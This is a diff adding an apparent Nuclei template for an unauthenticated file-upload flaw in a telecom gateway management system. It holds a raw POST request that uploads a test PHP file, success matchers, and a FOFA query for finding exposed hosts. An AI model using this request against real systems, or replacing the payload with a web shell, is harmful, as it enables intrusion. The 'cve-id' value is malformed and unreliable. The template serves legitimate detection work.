@@ -1,0 +1,50 @@
+id: 2024-106021524
+
+info:
+  name: 电信网关配置管理后台rewrite.php接口存在文件上传漏洞
+  author: k3ppf0r
+  severity: critical
+  description: |  
+    电信网关配置管理系统 /manager/teletext/material/rewrite.php 接口存在文件上传漏洞，未经身份验证的远程攻击者可以利用文件上传漏洞获取系统权限。
+  reference:
+    - https://blog.csdn.net/qq_39894062/article/details/138680137
+  remediation: |
+    打对应补丁，重启服务
+  classification:
+    cve-id: 2024-106021524
+    cvss-score: 9.5
+    cwe-id: CWE-434
+  metadata:
+    date: 2024-05-11
+    version: 电信网关配置管理系统
+    fofa-query: body="img/login_bg3.png" && body="系统登录"
+  tags: fileupload,rce
+
+
+http:
+  - raw:
+      - |-
+        POST /manager/teletext/material/rewrite.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
+        Connection: close
+        ------WebKitFormBoundaryOKldnDPT
+        Content-Disposition: form-data; name="tmp_name"; filename="test.php"
+        Content-Type: image/png
+        
+        <?php print("test"); ?>
+        ------WebKitFormBoundaryOKldnDPT
+        Content-Disposition: form-data; name="uploadtime"
+        
+        
+        ------WebKitFormBoundaryOKldnDPT--
+
+
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'contains(body_1, "ret_msg\":\"success")'
+        condition: and
